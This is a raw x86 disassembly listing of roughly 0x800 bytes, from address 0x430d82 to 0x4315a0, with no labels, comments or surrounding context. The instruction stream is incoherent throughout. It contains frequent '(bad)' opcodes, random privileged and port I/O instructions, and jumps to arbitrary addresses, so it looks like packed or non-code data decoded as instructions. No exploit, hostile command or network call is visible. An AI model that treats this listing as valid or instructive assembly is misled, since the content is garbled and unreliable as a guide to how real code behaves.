  430d82:	mov    edx,DWORD PTR [eax+0x51]
  430d85:	pop    edi
  430d86:	lea    ebx,[ebx-0x8]
  430d89:	ret    0x45
  430d8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d92:	xchg   eax,edi
  430d94:	mov    DWORD PTR [ebp-0x75],ecx
  430d97:	push   esi
  430d98:	clc    
  430d99:	jne    0x430d6b
  430d9b:	mov    ecx,0xf8450b0b
  430da0:	(bad)  
  430da1:	push   cs
  430da2:	or     BYTE PTR [ebp-0x3a],dh
  430da5:	cmp    eax,DWORD PTR [ecx]
  430da7:	pop    esi
  430da8:	(bad)  
  430da9:	or     al,0x5
  430dab:	inc    eax
  430dac:	leave  
  430dad:	jmp    0x40cf:0x25564204
  430db4:	leave  
  430db5:	in     eax,dx
  430db6:	inc    DWORD PTR [eax-0x75]
  430db9:	fimul  DWORD PTR [ebx-0x228139be]
  430dbf:	inc    eax
  430dc0:	nop
  430dc1:	loopne 0x430dc2
  430dc3:	ret    
  430dc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dca:	add    eax,0xff45e8f8
  430dcf:	push   esi
  430dd0:	push   DWORD PTR [ebp-0x39]
  430dd3:	mov    eax,0x7edda46
  430dd8:	or     al,0x6
  430dda:	push   DWORD PTR [ebp-0x3a]
  430ddd:	cmp    eax,DWORD PTR [edx]
  430ddf:	pop    esi
  430de0:	ret    
  430de1:	or     al,0x56
  430de3:	inc    ecx
  430de4:	push   ebp
  430de5:	jle    0x430dd3
  430de7:	inc    edx
  430de8:	inc    ebp
  430de9:	int    0x1
  430deb:	inc    ecx
  430dec:	sub    BYTE PTR ds:0xe77541fc,ah
  430df2:	add    DWORD PTR [edx+0x1c],eax
  430df5:	retf   0xc38b
  430df8:	adc    al,0x8b
  430dfa:	xchg   edx,eax
  430dfb:	push   ecx
  430dfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e02:	rcl    DWORD PTR [esi-0x9],cl
  430e05:	jne    0x430e57
  430e07:	mov    eax,0x7c80ece
  430e0c:	rol    DWORD PTR [esi],cl
  430e0e:	div    DWORD PTR [ebp+0x50]
  430e11:	cmp    ecx,edx
  430e13:	pop    esi
  430e14:	dec    BYTE PTR [edx]
  430e16:	in     al,dx
  430e17:	inc    edx
  430e18:	sub    esp,ecx
  430e1a:	inc    eax
  430e1b:	(bad)  
  430e1c:	push   eax
  430e1d:	add    edx,DWORD PTR [eax-0x1f]
  430e20:	push   edi
  430e21:	add    dh,dh
  430e23:	leave  
  430e24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e28:	add    BYTE PTR [ecx+0x0],dl
  430e2b:	inc    ebp
  430e2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e32:	add    BYTE PTR [eax-0x7fbf448],bh
  430e38:	add    al,0x2
  430e3a:	jmp    0x57eb994
  430e3f:	jne    0x430e29
  430e41:	mov    eax,DWORD PTR [edx]
  430e43:	or     BYTE PTR [eax],al
  430e45:	inc    ecx
  430e46:	stc    
  430e47:	in     eax,dx
  430e48:	ss inc eax
  430e4a:	aas    
  430e4b:	out    0x7d,eax
  430e4d:	inc    ecx
  430e4e:	mov    ebp,ecx
  430e50:	lock ret 0x7d
  430e54:	and    ecx,DWORD PTR [ebx-0x171777]
  430e5a:	add    bh,bh
  430e5c:	aad    0xd7
  430e5e:	add    dh,cl
  430e60:	clts   
  430e62:	(bad)  
  430e63:	call   0xffce0d68
  430e68:	hlt    
  430e69:	iret   
  430e6a:	jge    0x430e42
  430e6c:	rol    DWORD PTR [esi-0x80],cl
  430e6f:	jmp    0x1c5d7c
  430e74:	out    dx,al
  430e75:	mov    eax,DWORD PTR [ebx]
  430e77:	(bad)  
  430e78:	pop    esi
  430e79:	push   es
  430e7a:	cmp    al,0xe8
  430e7c:	sar    edi,0x8
  430e7f:	inc    DWORD PTR [edi]
  430e81:	inc    esi
  430e82:	(bad)  
  430e83:	loopne 0x430f03
  430e85:	push   edi
  430e86:	push   cs
  430e87:	push   ebx
  430e88:	add    BYTE PTR [ebx+0x24008b56],cl
  430e8e:	add    BYTE PTR [ebp+0x50],al
  430e91:	push   eax
  430e92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e98:	sub    edx,DWORD PTR [esi-0x24]
  430e9b:	jne    0x430e53
  430e9d:	lods   eax,DWORD PTR ds:[esi]
  430e9e:	mov    edx,DWORD PTR [edx-0x34]
  430ea1:	dec    esi
  430ea2:	out    0x83,eax
  430ea4:	into   
  430ea5:	push   edi
  430ea7:	loopne 0x430e77
  430ea9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ead:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430eb4:	rol    DWORD PTR [edx],0x8
  430eb7:	mov    esp,ecx
  430eb9:	cmp    DWORD PTR [ebx],0xc
  430ebc:	mov    esi,0x5001c0
  430ec1:	push   eax
  430ec2:	push   cs
  430ec3:	push   eax
  430ec4:	(bad)  
  430ec5:	sub    edx,edi
  430ec7:	push   esi
  430ec8:	adc    al,0xcb
  430eca:	ins    DWORD PTR es:[edi],dx
  430ecb:	mov    eax,0x203e8
  430ed0:	add    al,ah
  430ed2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ed9:	add    dh,al
  430edb:	add    ah,ch
  430edd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ee3:	pop    ecx
  430ee4:	or     eax,ebx
  430ee6:	cli    
  430ee7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430eed:	lea    ebp,[ebx]
  430eef:	mov    edx,DWORD PTR [edx-0x4]
  430ef2:	dec    ecx
  430ef3:	inc    ebp
  430ef4:	shr    BYTE PTR [ebx],0x4b
  430ef7:	and    al,0x0
  430ef9:	(bad)  
  430efa:	jne    0x430f41
  430efc:	pop    eax
  430efd:	mov    al,0x5a
  430eff:	call   0x142115e
  430f04:	and    al,0x85
  430f06:	push   edx
  430f07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f0b:	dec    ebp
  430f0c:	mov    cl,0x23
  430f0e:	jmp    0x430efc
  430f10:	mov    al,0xe7
  430f12:	call   0x1391200
  430f17:	shr    DWORD PTR [eax+ebx*2],cl
  430f1a:	lock (bad) 
  430f1c:	adc    eax,0x757f008d
  430f21:	out    0x58,eax
  430f23:	cmp    al,0x7
  430f25:	pop    edx
  430f26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f2d:	push   ecx
  430f2e:	cld    
  430f2f:	mov    esi,0x3b0175
  430f34:	and    al,0xb0
  430f36:	xor    BYTE PTR [edx+0x1],0x8b
  430f3a:	add    ah,bh
  430f3c:	mov    edi,DWORD PTR [ebp-0x4]
  430f3f:	psubsw mm7,QWORD PTR [edi]
  430f42:	add    DWORD PTR [ebp+0x0],ebp
  430f45:	rcr    eax,1
  430f47:	mov    edi,ecx
  430f49:	and    eax,DWORD PTR [eax]
  430f4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f51:	call   0x130123a
  430f56:	add    al,cl
  430f58:	mov    ebp,esi
  430f5a:	aam    0x83
  430f5c:	or     DWORD PTR [ecx],eax
  430f5e:	jne    0x430f51
  430f60:	mov    eax,DWORD PTR [eax]
  430f62:	aam    0x0
  430f64:	dec    ebp
  430f65:	jne    0x430ef2
  430f67:	cmp    ebx,eax
  430f69:	jb     0x430fb8
  430f6b:	jmp    0x430ef8
  430f6d:	mov    ebx,esp
  430f6f:	int3   
  430f70:	dec    ebp
  430f71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f78:	mov    edx,0x8b0a8b
  430f7d:	cmp    ecx,DWORD PTR [eax]
  430f7f:	jb     0x430f58
  430f81:	pop    edx
  430f82:	push   edi
  430f83:	cli    
  430f84:	pop    es
  430f85:	mov    eax,ecx
  430f87:	jb     0x430f8b
  430f89:	add    DWORD PTR [ebx],0xa
  430f8c:	mov    eax,DWORD PTR [ebx]
  430f8e:	int3   
  430f8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f95:	jmp    0x430f22
  430f97:	mov    al,0xe8
  430f99:	call   0x104121b
  430f9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430fa1:	pop    edi
  430fa2:	or     BYTE PTR [ecx-0x73],bl
  430fa5:	pop    ecx
  430fa6:	inc    edi
  430fa7:	xor    al,0xeb
  430fa9:	push   ecx
  430faa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fb0:	call   0xb210b5
  430fb5:	int3   
  430fb6:	sbb    BYTE PTR [esi],ch
  430fb8:	inc    ebp
  430fb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fbf:	call   0x9c122e
  430fc4:	or     BYTE PTR [ebx-0x73],dl
  430fc7:	cmp    al,0x47
  430fc9:	mov    al,0x1
  430fcb:	jb     0x430fcd
  430fcd:	mov    al,0x10
  430fcf:	push   eax
  430fd0:	add    al,0x75
  430fd2:	add    BYTE PTR [ebx],ch
  430fd4:	add    ebx,esp
  430fd6:	int3   
  430fd7:	jne    0x430fe9
  430fd9:	movsx  edx,cl
  430fdc:	add    DWORD PTR [eax],eax
  430fde:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430fe5:	mov    gs,edi
  430fe7:	add    BYTE PTR [eax-0x50],ch
  430fea:	add    al,ch
  430fec:	mov    eax,DWORD PTR [ecx]
  430fee:	sub    eax,DWORD PTR [eax]
  430ff0:	jb     0x431067
  430ff2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ff6:	jge    0x430fe0
  430ff8:	add    al,0x1
  430ffa:	add    DWORD PTR [eax],0x0
  430ffd:	jne    0x430fff
  430fff:	je     0x431046
  431001:	mov    eax,DWORD PTR [edi]
  431003:	ror    BYTE PTR [ebp+0x4d],1
  431006:	or     DWORD PTR [ecx+0x4d03d004],0x3
  43100d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431013:	mov    DWORD PTR [ebx],ebp
  431015:	fadd   DWORD PTR [eax+0x75]
  431018:	inc    eax
  431019:	pop    eax
  43101a:	lea    ebx,[ecx+0x4f]
  43101d:	push   0xb1000003
  431022:	out    dx,eax
  431023:	add    ebp,DWORD PTR [edx+edx*2]
  431026:	add    BYTE PTR [ebx+ecx*4],bh
  431029:	mov    ch,BYTE PTR [ebx]
  43102b:	jb     0x43109f
  43102d:	add    al,0x89
  43102f:	push   eax
  431030:	call   0x842b5da2
  431035:	add    DWORD PTR [eax+eax*1],eax
  431038:	jae    0x43104e
  43103a:	icebp  
  43103b:	inc    ebp
  43103c:	mov    eax,DWORD PTR gs:[ecx]
  43103f:	int3   
  431040:	out    dx,al
  431041:	loopne 0x431090
  431043:	sub    eax,DWORD PTR [edx]
  431045:	push   0xffffff83
  431047:	pop    esi
  431048:	push   cs
  431049:	jl     0x431064
  43104b:	add    al,0xaf
  43104d:	xor    eax,0x832b6d00
  431052:	mov    eax,DWORD PTR [edx]
  431054:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43105a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431060:	inc    ebp
  431061:	shr    ebx,0x3
  431064:	or     DWORD PTR [eax],0x4
  431067:	push   0xffffffa5
  431069:	pop    esi
  43106a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431071:	jmp    0x4310d0
  431073:	mov    edi,0xff0272
  431078:	fdivr  QWORD PTR [ebp+0x5d]
  43107b:	push   0x4e
  43107d:	pop    ecx
  43107e:	call   0x435483
  431083:	mov    DWORD PTR [ebx],eax
  431085:	in     al,0xc8
  431087:	rol    BYTE PTR [ebp-0x75],0xc1
  43108b:	call   0xad126c
  431090:	pop    esi
  431091:	enter  0xceff,0x8b
  431095:	repz mov ecx,DWORD PTR [ebp-0x34]
  431099:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310a0:	je     0x4310a2
  4310a2:	or     DWORD PTR [ebx-0x74183b24],eax
  4310a8:	jne    0x43108e
  4310aa:	jmp    0x4310a5
  4310ac:	push   DWORD PTR [edx-0x24]
  4310af:	push   0x4d
  4310b1:	pop    ecx
  4310b2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310b6:	jge    0x4310be
  4310b8:	mov    eax,eax
  4310ba:	sub    ebp,DWORD PTR [edx+0x24]
  4310bd:	pop    esi
  4310be:	inc    ebp
  4310bf:	mov    esp,0x8b6077
  4310c4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310ca:	lods   al,BYTE PTR ds:[esi]
  4310cb:	add    BYTE PTR [ebx],bh
  4310cd:	enter  0xce73,0x49
  4310d1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310d9:	stc    
  4310da:	jge    0x43114e
  4310dc:	jnp    0xdd42944b
  4310e2:	call   0xc611b8
  4310e7:	fadd   st(0),st
  4310e9:	dec    esi
  4310ea:	ins    BYTE PTR es:[edi],dx
  4310eb:	stc    
  4310ec:	cmp    al,0x73
  4310ee:	push   ebp
  4310ef:	mov    eax,0xf8028b
  4310f4:	jne    0x4310b7
  4310f6:	mov    esi,ecx
  4310f8:	mov    esp,DWORD PTR [ebp+0x2c]
  4310fb:	add    edi,DWORD PTR [ebp-0x24]
  4310fe:	sub    esp,eax
  431100:	and    al,0x45
  431102:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431108:	sbb    al,0xee
  43110a:	pop    esi
  43110b:	call   0x83113b
  431110:	fsubr  st,st(3)
  431112:	sti    
  431113:	add    BYTE PTR gs:[ecx],bh
  431116:	add    eax,esp
  431118:	add    DWORD PTR [esi],eax
  43111a:	rol    DWORD PTR [ebp+0x8],0x29
  43111e:	mov    esp,eax
  431120:	clc    
  431121:	jne    0x431198
  431123:	mov    eax,0x8b0673
  431128:	loopne 0x43116f
  43112a:	loopne 0x4310b5
  43112c:	lods   al,BYTE PTR ds:[esi]
  43112d:	int3   
  43112e:	inc    ebp
  43112f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431133:	add    al,0xc3
  431135:	sub    ecx,DWORD PTR [ebp+0x47]
  431138:	(bad)  
  43113a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43113e:	add    eax,DWORD PTR [eax]
  431140:	call   0x644d245
  431145:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43114b:	dec    esi
  43114c:	ins    DWORD PTR es:[edi],dx
  43114d:	in     al,dx
  43114e:	lea    eax,[eax]
  431150:	inc    ebp
  431151:	inc    ebp
  431152:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431158:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431162:	and    al,0xdc
  431164:	ror    DWORD PTR [edx+0x24],0xf7
  431168:	or     BYTE PTR [ebp+0x4c],dh
  43116b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43116f:	stos   BYTE PTR es:[edi],al
  431170:	adc    edx,edi
  431172:	inc    esp
  431173:	add    edi,DWORD PTR [eax]
  431175:	jne    0x43115a
  431177:	mov    DWORD PTR [eax-0x7449db04],ecx
  43117d:	cmp    ecx,DWORD PTR [edi]
  43117f:	sub    BYTE PTR [ebp-0x7e],dl
  431182:	sar    ebp,0xb
  431185:	jmp    FWORD PTR [edi+0x2400392a]
  43118b:	sub    esi,DWORD PTR [ebx-0x73]
  43118e:	mov    esp,DWORD PTR [ecx+edi*4]
  431191:	mov    ecx,DWORD PTR [eax]
  431193:	and    BYTE PTR [eax],al
  431195:	jne    0x431161
  431197:	sub    ebp,ecx
  431199:	sbb    BYTE PTR [esi+0x32],ah
  43119c:	dec    ebp
  43119d:	push   ebp
  43119e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311a4:	ret    
  4311a5:	mov    edx,ebp
  4311a7:	leave  
  4311a8:	sub    DWORD PTR [esi+0x24],ebx
  4311ab:	ret    0x2b
  4311ae:	pop    ax
  4311b0:	push   ebp
  4311b1:	rol    BYTE PTR [ebx],0xeb
  4311b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311bb:	jb     0x431212
  4311bd:	ret    
  4311be:	in     al,dx
  4311bf:	jecxz  0x43114c
  4311c1:	push   esi
  4311c2:	xchg   esp,eax
  4311c3:	jne    0x4311c5
  4311c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4311c8:	jne    0x4311ae
  4311ca:	mov    eax,DWORD PTR [ebp-0x77]
  4311cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311d4:	mov    esi,DWORD PTR [ebp-0x75]
  4311d7:	pop    esi
  4311d8:	nop
  4311d9:	mov    eax,DWORD PTR [eax]
  4311db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311e1:	add    al,0x0
  4311e3:	inc    ebp
  4311e4:	mov    eax,DWORD PTR [ebx]
  4311e6:	mov    ebp,ebx
  4311e8:	cmp    al,0xf
  4311ea:	or     al,al
  4311ec:	inc    ebp
  4311ed:	inc    ebp
  4311ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4311f4:	cld    
  4311f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4311fb:	add    BYTE PTR [ecx-0x5],dl
  4311fe:	add    eax,0x17200
  431203:	sbb    al,0x85
  431205:	dec    esp
  431206:	je     0x431240
  431208:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43120c:	add    BYTE PTR [ebx],bh
  43120e:	(bad)  
  43120f:	and    al,0x32
  431211:	jae    0x4311af
  431213:	mov    cl,cl
  431215:	inc    DWORD PTR [esp]
  431218:	push   ebp
  431219:	shr    esp,0x8
  43121c:	in     al,dx
  43121d:	push   esp
  43121e:	add    DWORD PTR [eax],esp
  431220:	add    bl,cl
  431222:	inc    ebp
  431223:	mov    bh,0x89
  431225:	add    ah,bh
  431227:	jmp    0xca752171
  43122c:	pushf  
  43122d:	dec    esp
  43122e:	mov    edx,0xf8178520
  431233:	fst    DWORD PTR [ebp+0x0]
  431236:	mov    BYTE PTR [eax],0xc4
  431239:	sub    edx,DWORD PTR [ebx-0x3f]
  43123c:	inc    ebp
  43123d:	add    eax,0xc601da
  431242:	mov    al,0xc6
  431245:	ins    BYTE PTR es:[edi],dx
  431246:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43124d:	dec    esp
  43124e:	jmp    DWORD PTR [eax]
  431250:	inc    ebp
  431251:	fnstcw WORD PTR [esi+0x29]
  431254:	test   BYTE PTR [eax],0xc8
  431257:	rol    BYTE PTR [eax],0xc0
  43125a:	lea    ecx,[ebp-0x3cf0dbcb]
  431260:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431266:	inc    esi
  431267:	add    DWORD PTR [eax],ebx
  431269:	add    dh,bh
  43126b:	mov    esi,DWORD PTR [edx+0x8]
  43126e:	(bad)  
  43126f:	fdiv   QWORD PTR ss:[ecx]
  431272:	(bad)  
  431273:	mov    bl,ch
  431275:	add    esi,eax
  431277:	add    dh,bl
  431279:	or     esi,eax
  43127b:	mov    dl,0xdf
  43127d:	add    esi,eax
  43127f:	add    al,ah
  431281:	push   cs
  431282:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431289:	or     BYTE PTR [ebx],dh
  43128b:	dec    ecx
  43128c:	lea    eax,[ebx]
  43128e:	xor    eax,0x18fc0fc7
  431293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431294:	repz clc 
  431296:	add    eax,DWORD PTR [ebp+0x46]
  431299:	prefetcht0 BYTE PTR [ecx-0x2]
  43129d:	xor    eax,0x7c60872
  4312a2:	mov    esp,0xbd32c69b
  4312a7:	pop    esi
  4312a8:	mov    cl,0xbe
  4312ab:	or     al,0xc6
  4312ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312bb:	add    dh,al
  4312bd:	mov    eax,ebx
  4312bf:	xor    DWORD PTR [ebx],0x35008dbc
  4312c5:	mov    ecx,DWORD PTR [edi]
  4312c7:	sbb    al,0x18
  4312c9:	inc    ebp
  4312ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312d1:	clc    
  4312d2:	(bad)  
  4312d3:	xor    DWORD PTR [edx-0x64],esi
  4312d6:	lea    ecx,[ecx+0x45ffe838]
  4312dc:	mov    ecx,ebx
  4312de:	fadd   st,st(6)
  4312e0:	dec    ebp
  4312e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312e7:	out    0x1,eax
  4312e9:	inc    ebp
  4312ea:	lea    ebp,ds:0xc8ffc6ff
  4312f0:	enter  0xa33,0xc6
  4312f4:	push   ebp
  4312f5:	leave  
  4312f6:	(bad)  
  4312f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4312fd:	add    BYTE PTR [ebp+0x44],al
  431300:	mov    eax,esp
  431302:	mov    WORD PTR [esi+0x46398300],?
  431308:	psubusw mm4,QWORD PTR [esi-0x78]
  43130c:	add    BYTE PTR [ebx-0x1303f975],al
  431312:	add    BYTE PTR [ebp+0x1],0xeb
  431316:	add    BYTE PTR [ebp+0x38],al
  431319:	in     eax,dx
  43131a:	inc    ebp
  43131b:	inc    ebp
  43131c:	mov    ebx,ebx
  43131e:	add    BYTE PTR [ebp+0x0],0xec
  431322:	mov    DWORD PTR [ebp-0x41],eax
  431325:	sub    eax,0x2c00454e
  43132a:	ins    DWORD PTR es:[edi],dx
  43132b:	inc    ebp
  43132c:	add    BYTE PTR [esi+0x66],bh
  43132f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431336:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431340:	dec    edi
  431341:	pop    es
  431342:	add    ah,ch
  431344:	mov    DWORD PTR [ebp+0x68],eax
  431347:	in     eax,dx
  431348:	inc    DWORD PTR [ebp-0x7d]
  43134b:	out    0xc0,al
  43134d:	inc    ebp
  43134e:	mov    edx,esp
  431350:	push   0x45
  431352:	(bad)  
  431353:	jmp    0xdf925910
  431358:	add    BYTE PTR [ebp-0x77],al
  43135b:	out    dx,al
  43135c:	ins    BYTE PTR es:[edi],dx
  43135d:	inc    ebp
  43135e:	jmp    edi
  431360:	add    DWORD PTR [ebp-0x14],0x7e
  431364:	mov    esi,esi
  431366:	outs   dx,BYTE PTR ds:[esi]
  431367:	inc    esp
  431368:	(bad)  
  431369:	mov    esp,0x8341b68d
  43136e:	mov    DWORD PTR [esi+0x70],eax
  431371:	fcos   
  431373:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431379:	in     al,dx
  43137a:	jb     0x431301
  43137c:	(bad)  
  43137d:	dec    DWORD PTR [ebx-0x7aba9901]
  431383:	mov    edi,edi
  431385:	fdivr  st,st(7)
  431387:	out    dx,eax
  431388:	rcl    BYTE PTR [ebx],0x66
  43138b:	mov    DWORD PTR [ebp-0xc70075],eax
  431391:	(bad)  
  431392:	std    
  431393:	cmp    eax,DWORD PTR [eax]
  431395:	jne    0x4313fd
  431397:	mov    DWORD PTR [ebp-0xba0048],eax
  43139d:	in     al,dx
  43139e:	outs   dx,BYTE PTR ds:[esi]
  43139f:	pushf  
  4313a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313a6:	inc    DWORD PTR [ecx]
  4313a8:	inc    DWORD PTR [eax]
  4313aa:	jae    0x4313e4
  4313ac:	add    BYTE PTR [ebp+0x850266],al
  4313b2:	inc    DWORD PTR [ebp-0x1]
  4313b5:	mov    eax,eax
  4313b7:	jl     0x43141f
  4313b9:	add    BYTE PTR [ebp-0x740077],al
  4313bf:	cld    
  4313c0:	dec    eax
  4313c1:	add    BYTE PTR [eax],0x1
  4313c4:	data16 add BYTE PTR [ebp+0x38],al
  4313c8:	mov    eax,0x47c2
  4313cd:	mov    eax,0x824f89
  4313d2:	inc    edi
  4313d3:	mov    DWORD PTR [edx+0x64],ebp
  4313d6:	inc    WORD PTR [ebp-0x75]
  4313da:	(bad)  
  4313db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313e2:	inc    ebp
  4313e3:	jge    0x4313c4
  4313e5:	add    bh,ah
  4313e7:	lea    ax,[ebp-0x750030]
  4313ee:	add    al,0x46
  4313f1:	jmp    0x40ff:0x8885
  4313f7:	push   DWORD PTR [ebp+0x52]
  4313fa:	lea    eax,[eax]
  4313fc:	shl    BYTE PTR [esi-0x7b],1
  4313ff:	test   esi,edi
  431401:	(bad)  
  431402:	(bad)  
  431403:	inc    DWORD PTR [ebp-0x990140]
  431409:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43140f:	inc    edi
  431410:	push   ecx
  431411:	xor    ax,WORD PTR [ebp-0x8d0045]
  431418:	add    al,al
  43141a:	ret    
  43141b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431422:	push   eax
  431423:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43142a:	add    BYTE PTR [ebx-0x764f8839],al
  431430:	push   DWORD PTR [esi+0x1]
  431433:	inc    DWORD PTR [eax]
  431435:	mov    eax,0xff99ff
  43143a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431440:	jne    0x4313fa
  431442:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43144c:	mov    ecx,0xd74fb8
  431451:	add    cl,al
  431453:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431459:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431460:	(bad)  
  431461:	push   ebp
  431463:	mov    eax,0x8c2789
  431468:	ret    0x6689
  43146b:	adc    BYTE PTR [ebp+0x48],0x8d
  43146f:	add    bh,ah
  431471:	mov    WORD PTR [ebp-0x70],ax
  431475:	(bad)  
  431476:	ret    0x667d
  431479:	or     BYTE PTR [ebp-0x77],dl
  43147c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431483:	loop   0x43140e
  431485:	(bad)  
  431486:	xchg   esi,eax
  431487:	aam    0xcf
  431489:	out    dx,al
  43148a:	mov    DWORD PTR [esi-0x68],edi
  43148d:	inc    ebp
  43148e:	dec    edx
  43148f:	pop    ecx
  431490:	mov    edx,DWORD PTR [eax]
  431492:	repnz push bp
  431495:	or     BYTE PTR [ebx+0x55106638],0x49
  43149c:	(bad)  
  43149d:	repnz xor eax,0xa0898945
  4314a3:	mov    ah,0x89
  4314a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4314ab:	inc    DWORD PTR [ebp+0x50]
  4314ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314b2:	mov    DWORD PTR [eax],ecx
  4314b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314b5:	pop    es
  4314b6:	inc    ecx
  4314b7:	(bad)  
  4314b8:	data16 fwait
  4314ba:	inc    ebp
  4314bb:	xor    ah,BYTE PTR [esi+0x3]
  4314be:	dec    ebp
  4314bf:	push   eax
  4314c0:	inc    bp
  4314c2:	jge    0x431447
  4314c4:	mov    esp,DWORD PTR [esi-0x18]
  4314c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314cd:	add    DWORD PTR [ebx],esi
  4314cf:	add    BYTE PTR [ebx],al
  4314d1:	test   DWORD PTR [ebx],esi
  4314d3:	(bad)  
  4314d4:	inc    WORD PTR [ebp+0x0]
  4314d8:	mov    eax,DWORD PTR [eax]
  4314da:	call   0x8898cc0f
  4314df:	mov    esi,eax
  4314e1:	clc    
  4314e2:	ret    
  4314e3:	rol    cl,0xa
  4314e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4314ec:	mov    edx,edi
  4314ee:	pushf  
  4314ef:	pop    es
  4314f0:	jmp    FWORD PTR [edx+0x66]
  4314f3:	add    BYTE PTR [ebp-0x990175],al
  4314f9:	inc    ebp
  4314fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431500:	push   ebp
  431501:	mov    edi,eax
  431503:	mov    dh,BYTE PTR [eax+0x266ff51]
  431509:	push   ebp
  43150a:	add    BYTE PTR [ebx-0x764b0777],al
  431510:	dec    DWORD PTR [esi+0x661851e8]
  431516:	add    BYTE PTR [ebp-0x7b],dl
  431519:	cmp    esi,0xfffffffb
  43151c:	dec    DWORD PTR [ecx+0x51fe9285]
  431522:	jmp    DWORD PTR [esi-0x75]
  431525:	push   ebp
  431526:	hlt    
  431527:	data16 (bad) 
  431529:	dec    ebp
  43152a:	ret    
  43152b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431531:	lea    edx,[eax-0x1]
  431534:	jne    0x431507
  431536:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43153c:	dec    BYTE PTR [ecx+0x51559eff]
  431542:	mov    DWORD PTR [esi-0x4c],esp
  431545:	push   ebp
  431546:	jmp    DWORD PTR [esi-0x18]
  431549:	inc    ebp
  43154a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431550:	(bad)  
  431551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431552:	inc    eax
  431554:	test   DWORD PTR [esi-0x2],esp
  431557:	inc    ebp
  431558:	dec    DWORD PTR [ebp-0x760bde75]
  43155e:	(bad)  
  43155f:	test   al,0xc3
  431561:	mov    DWORD PTR [ebp-0x769b56],ecx
  431567:	lods   al,BYTE PTR ds:[esi]
  431568:	push   eax
  431569:	inc    ebp
  43156a:	jne    0x43157b
  43156c:	dec    DWORD PTR [ebp+0x8]
  43156f:	mov    ecx,DWORD PTR [ebx]
  431571:	sbb    al,0x0
  431573:	(bad)  
  431574:	mov    eax,0xc14fc3
  431579:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43157f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431583:	xor    eax,DWORD PTR [eax]
  431585:	add    eax,edi
  431587:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43158d:	xor    edi,DWORD PTR [eax+0x854f66]
  431593:	dec    BYTE PTR [ecx-0x76bb01]
  431599:	mov    BYTE PTR [ebx-0x76724001],al
  43159f:	pushf  
  4315a0:	inc    esi
